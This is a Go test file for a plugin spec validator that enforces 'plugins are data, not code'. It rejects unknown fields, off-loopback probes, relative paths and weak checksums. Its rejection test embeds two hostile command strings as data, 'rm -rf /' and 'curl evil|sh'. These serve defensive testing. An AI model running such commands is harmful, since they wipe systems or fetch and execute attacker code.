package plugins_test

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/zizdog/zizpanel/internal/plugins"
	"github.com/zizdog/zizpanel/internal/services"
)

// TestFixturesAreValid 两份真实应用的声明必须过校验（P0 的"能不能覆盖现实"判据）。
func TestBuiltinSpecsAreValid(t *testing.T) {
	ids := plugins.BuiltinIDs()
	if len(ids) == 0 {
		t.Fatal("内建插件表为空：embed 没生效，或两份声明都不合法（打包事故，必须红）")
	}
	for _, id := range ids {
		s, ok := plugins.Builtin(id)
		if !ok {
			t.Fatalf("%s 应当能被 Builtin 取到", id)
		}
		if s.Schema != plugins.SchemaV1 {
			t.Errorf("%s 的 schema 应为 %s", id, plugins.SchemaV1)
		}
		if plugins.PlanText(s) == "" {
			t.Errorf("%s 的 plan 不该为空", id)
		}
	}
}

// TestFixturesMatchBuiltinCatalog 是**防漂移**门禁：只要这份表与 Go 里的目录定义同时存在，
// 就断言它们说的是同一件事（端口、健康路径、安装根）。P1（由表驱动目录）做完后这条会被替换。
func TestFixturesMatchBuiltinCatalog(t *testing.T) {
	cases := []struct{ id, rootDir string }{
		{"alist", "alist"},
		{"syncthing", ""},
	}
	for _, c := range cases {
		s, ok := plugins.Builtin(c.id)
		if !ok {
			t.Fatalf("内建表里没有 %s", c.id)
		}
		app, ok := services.FindApp(c.id)
		if !ok {
			t.Fatalf("目录里没有 %s —— 表与代码已经不一致", c.id)
		}
		if app.Port != s.Expose.Port {
			t.Errorf("%s：表里端口 %d，目录里 %d", c.id, s.Expose.Port, app.Port)
		}
		if strings.TrimSpace(app.HealthPath) != strings.TrimSpace(s.Health.Path) {
			t.Errorf("%s：表里健康路径 %q，目录里 %q", c.id, s.Health.Path, app.HealthPath)
		}
		if c.rootDir != "" {
			if len(s.Uninstall.OptionalData) == 0 {
				t.Fatalf("%s：卸载的 optional_data 为空", c.id)
			}
			want := "~/" + c.rootDir
			got := strings.Join(s.Uninstall.OptionalData, ",")
			if !strings.Contains(got, want) {
				t.Errorf("%s：安装根应在 optional_data 里（%s），表里写的是 %q", c.id, want, got)
			}
		}
	}
}

// TestUnknownKeysAreRejected 是**安全边界**门禁：插件只是数据，不许夹带任何"跑一段东西"的字段。
// 解码用 DisallowUnknownFields，所以下面这些键一律当场报错。
func TestUnknownKeysAreRejected(t *testing.T) {
	base := `{"schema":"zizpanel.app/v1","id":"x","name":"X","icon":"x",
	  "source":{"kind":"brew","formula":"x"},
	  "run":{"mode":"brew-service"},
	  "verify":{"any_of":[{"kind":"port","port":1234}]},
	  "health":{"kind":"port","port":1234},
	  "uninstall":{"artifacts":["~/x"]}}`
	for _, extra := range []string{
		`,"post_install_script":"rm -rf /"`,
		`,"steps":[{"cmd":"curl evil|sh"}]`,
	} {
		if _, err := plugins.Parse([]byte(strings.Replace(base, "}", extra+"}", 1)), "bad.json"); err == nil {
			t.Errorf("夹带 %s 的声明必须被拒绝（插件不许带代码）", extra)
		}
	}
	// run 里塞 steps 也要拒
	bad := strings.Replace(base, `"run":{"mode":"brew-service"}`,
		`"run":{"mode":"brew-service","steps":[{"cmd":"x"}]}`, 1)
	if _, err := plugins.Parse([]byte(bad), "bad.json"); err == nil {
		t.Error("run.steps 必须被拒绝")
	}
}

// baseSpec 每次返回一份**合法**声明（用 map 构造，负向用例按字段改，别做字符串手术 ——
// 那会改坏 JSON，测出来的是解析错误而不是我们要验的不变量）。
func baseSpec() map[string]any {
	return map[string]any{
		"schema": "zizpanel.app/v1",
		"id":     "demo",
		"name":   "Demo",
		"icon":   "🧪",
		"source": map[string]any{"kind": "release", "repo": "a/b", "asset": "c.tar.gz",
			"binary": "c", "checksum": "sha256"},
		"run":       map[string]any{"mode": "panel-daemon", "supervise": map[string]any{"bin": "/opt/homebrew/bin/c"}},
		"config":    map[string]any{"path": "~/demo/demo.conf", "mode": "0600", "secrets": []string{"token"}},
		"expose":    map[string]any{"port": 1234, "bind": "0.0.0.0", "ui": "app"},
		"verify":    map[string]any{"any_of": []any{map[string]any{"kind": "rpc", "url": "http://127.0.0.1:1234/jsonrpc", "method": "demo.version"}}},
		"health":    map[string]any{"kind": "rpc", "url": "http://127.0.0.1:1234/jsonrpc", "method": "demo.version"},
		"uninstall": map[string]any{"always": []string{"~/demo/lib"}, "optional_data": []string{"~/demo"}},
		"update":    map[string]any{"kind": "release-index"},
	}
}

func parseSpec(t *testing.T, m map[string]any) error {
	t.Helper()
	raw, err := json.Marshal(m)
	if err != nil {
		t.Fatal(err)
	}
	_, err = plugins.Parse(raw, "case.json")
	return err
}

// TestValidateRejectsUnsafeOrIncomplete 逐条不变量都要能失败（负向对照）。
func TestValidateRejectsUnsafeOrIncomplete(t *testing.T) {
	if err := parseSpec(t, baseSpec()); err != nil {
		t.Fatalf("基准声明应当合法，却被拒：%v", err)
	}
	cases := []struct {
		name   string
		mutate func(map[string]any)
		want   string
	}{
		{"schema 版本不对", func(m map[string]any) { m["schema"] = "zizpanel.app/v2" }, "schema"},
		{"id 带大写", func(m map[string]any) { m["id"] = "Demo" }, "id"},
		{"release 没声明校验强度", func(m map[string]any) { m["source"].(map[string]any)["checksum"] = "" }, "checksum"},
		{"校验强度瞎写", func(m map[string]any) { m["source"].(map[string]any)["checksum"] = "crc32" }, "checksum"},
		{"panel-daemon 没给 supervise", func(m map[string]any) { m["run"] = map[string]any{"mode": "panel-daemon"} }, "supervise"},
		{"supervise 用相对路径", func(m map[string]any) {
			m["run"].(map[string]any)["supervise"].(map[string]any)["bin"] = "opt/homebrew/bin/c"
		}, "绝对路径"},
		{"bind 写成具体内网地址", func(m map[string]any) { m["expose"].(map[string]any)["bind"] = "192.0.2.7" }, "bind"},
		{"端口越界", func(m map[string]any) { m["expose"].(map[string]any)["port"] = 70000 }, "port"},
		{"探针打外网", func(m map[string]any) {
			m["verify"].(map[string]any)["any_of"] = []any{map[string]any{"kind": "rpc", "url": "http://example.com/jsonrpc", "method": "x"}}
		}, "回环"},
		{"walk 探针 kind 不存在", func(m map[string]any) {
			m["verify"].(map[string]any)["any_of"] = []any{map[string]any{"kind": "shell", "path": "/"}}
		}, "verify.any_of"},
		{"卸载产物为空", func(m map[string]any) { m["uninstall"] = map[string]any{} }, "always"},
		{"卸载产物相对路径", func(m map[string]any) { m["uninstall"].(map[string]any)["always"] = []string{"demo"} }, "绝对路径"},
		{"可选删数据相对路径", func(m map[string]any) { m["uninstall"].(map[string]any)["optional_data"] = []string{"demo"} }, "绝对路径"},
		{"缺 health", func(m map[string]any) { delete(m, "health") }, "health"},
		{"verify 为空", func(m map[string]any) { m["verify"] = map[string]any{"any_of": []any{}} }, "verify"},
		{"未知内建补丁", func(m map[string]any) {
			m["source"] = map[string]any{"kind": "brew", "formula": "c"}
			m["run"] = map[string]any{"mode": "brew-service", "hooks": []string{"my-own-script"}}
		}, "内建补丁"},
		{"app-daemon 没给 bin", func(m map[string]any) { m["run"] = map[string]any{"mode": "app-daemon"} }, "run.bin"},
		{"brew-service 却用 release 来源", func(m map[string]any) { m["run"] = map[string]any{"mode": "brew-service"} }, "brew"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			m := baseSpec()
			c.mutate(m)
			err := parseSpec(t, m)
			if err == nil {
				t.Fatalf("必须被拒绝：%s", c.name)
			}
			if !strings.Contains(err.Error(), c.want) {
				t.Errorf("错误信息应提到 %q，实际：%v", c.want, err)
			}
		})
	}
}

// TestLoadMissingFile 给 CLI 一个明确错误（别 panic）。
func TestLoadMissingFile(t *testing.T) {
	if _, err := plugins.Load("/nonexistent/plugins/nope.json"); err == nil {
		t.Fatal("文件不存在应当报错")
	}
}
